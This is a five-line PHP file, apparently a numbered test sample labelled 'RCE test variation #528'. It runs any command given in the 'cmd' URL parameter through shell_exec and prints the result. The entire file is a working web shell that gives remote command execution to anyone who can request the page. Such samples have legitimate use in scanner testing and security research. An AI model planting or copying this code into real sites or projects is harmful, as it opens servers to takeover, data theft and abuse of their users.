<?php
// RCE test variation #528
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>